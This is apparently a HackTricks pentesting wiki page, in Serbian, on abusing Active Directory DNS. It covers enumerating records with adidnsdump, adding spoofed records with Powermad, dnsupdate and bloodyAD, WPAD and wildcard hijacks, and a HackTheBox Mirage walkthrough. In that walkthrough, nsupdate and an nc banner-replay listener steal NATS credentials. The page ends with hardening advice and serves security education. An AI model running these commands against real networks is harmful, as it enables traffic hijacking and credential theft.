# AD DNS zapisi

{{#include ../../banners/hacktricks-training.md}}

Po podrazumevanoj postavci **bilo koji korisnik** u Active Directory-ju može **enumerisati sve DNS zapise** u DNS zonama domena ili šume, slično zone transferu (korisnici mogu nabrajati podobjekte DNS zone u AD okruženju).

Alat [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) omogućava **enumeraciju** i **izvoz** **svih DNS zapisa** iz zone u svrhu recona internih mreža.
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (April 2025) dodaje JSON/Greppable (`--json`) izlaz, multi-threaded DNS resolution i podršku za TLS 1.2/1.3 pri povezivanju na LDAPS

For more information read [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## Kreiranje / Izmena zapisa (ADIDNS spoofing)

Pošto grupa **Authenticated Users** prema zadatim podešavanjima ima **Create Child** na DACL zone, svaki domain account (ili computer account) može registrovati dodatne zapise. Ovo se može iskoristiti za traffic hijacking, NTLM relay coercion ili čak full domain compromise.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py dolazi uz Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Uobičajene tehnike napada

1. **Wildcard record** – `*.<zone>` pretvara AD DNS server u enterprise-wide responder sličan LLMNR/NBNS spoofingu. Može se zloupotrebiti za hvatanje NTLM hashes ili za njihovo relay-ovanje ka LDAP/SMB. (Zahteva da WINS-lookup bude onemogućen.)
2. **WPAD hijack** – dodajte `wpad` (ili an **NS** record koji pokazuje na napadački host da biste zaobišli Global-Query-Block-List) i transparentno preusmeravajte outbound HTTP zahteve kako biste prikupili kredencijale. Microsoft je zakrpio wildcard/DNAME bypass-e (CVE-2018-8320) ali **NS-records i dalje rade**.
3. **Stale entry takeover** – prisvojite IP adresu koja je ranije pripadala radnoj stanici i povezani DNS zapis će i dalje rešavati, omogućavajući resource-based constrained delegation ili Shadow-Credentials napade bez diranja DNS-a.
4. **DHCP → DNS spoofing** – na podrazumevanoj Windows DHCP+DNS implementaciji neautentifikovani napadač na istoj subnet mreži može prepisati bilo koji postojeći A record (uključujući Domain Controllers) slanjem falsifikovanih DHCP zahteva koji pokreću dynamic DNS updates (Akamai “DDSpoof”, 2023). Ovo omogućava machine-in-the-middle poziciju nad Kerberos/LDAP i može dovesti do full domain takeover.
5. **Certifried (CVE-2022-26923)** – promenite `dNSHostName` naloga mašine koju kontrolišete, registrujte odgovarajući A record, pa zatim zatražite sertifikat za to ime kako biste imitirali DC. Alati poput **Certipy** ili **BloodyAD** u potpunosti automatizuju tok.

---

### Interno preuzimanje servisa putem zastarelih dinamičkih zapisa (NATS studija slučaja)

Kada su dinamičke izmene otvorene za sve autentifikovane korisnike, **ime servisa koje je odregistrovano može biti ponovo preuzeto i usmereno na napadačku infrastrukturu**. Mirage HTB DC je eksponirao hostname `nats-svc.mirage.htb` nakon DNS scavenginga, tako da je bilo koji korisnik sa niskim privilegijama mogao:

1. **Potvrdite da zapis nedostaje** i saznajte SOA pomoću `dig`:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **Ponovo kreirajte zapis** prema eksternom/VPN interfejsu koji kontrolišu:
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Impersonate the plaintext service**. NATS klijenti očekuju da vide jedan `INFO { ... }` banner pre nego što pošalju credentials, tako da kopiranje legitimnog bannera sa pravog brokera je dovoljno za prikupljanje tajni:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Bilo koji klijent koji razreši oteto ime će odmah leak-ovati svoj JSON `CONNECT` frame (uključujući `"user"`/`"pass"`) listeneru. Pokretanje zvaničnog `nats-server -V` binarnog fajla na hostu napadača, isključivanje redact-ovanja logova ili samo prisluškivanje sesije sa Wireshark daje iste plaintext credentials zato što je TLS bio opcion.

4. **Pivot with the captured creds** – u Mirage ukradeni NATS nalog je obezbedio JetStream pristup, što je otkrilo istorijske događaje autentifikacije koji sadrže ponovo iskoristive AD korisničke/lozinke.

---

## Detekcija i ojačavanje

* Deny **Authenticated Users** the *Create all child objects* right na osetljivim zonama i delegirajte dinamička ažuriranja dedikovanom nalogu koji koristi DHCP.
* Ako su potrebna dynamic updates, postavite zonu na **Secure-only** i omogućite **Name Protection** u DHCP tako da samo owner computer object može prepisati svoj zapis.
* Monitor DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer) i LDAP zapise upisane u `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Block opasna imena (`wpad`, `isatap`, `*`) pomoću namerno-benignog zapisa ili putem Global Query Block List.
* Održavajte DNS servere ažurnim – npr. RCE bagovi CVE-2024-26224 i CVE-2024-26231 dostigli su **CVSS 9.8** i mogu se iskoristiti remote protiv Domain Controllers.

## References

- Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More” (2018, i dalje de-facto referenca za wildcard/WPAD napade)
- Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dec 2023)
- [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
{{#include ../../banners/hacktricks-training.md}}
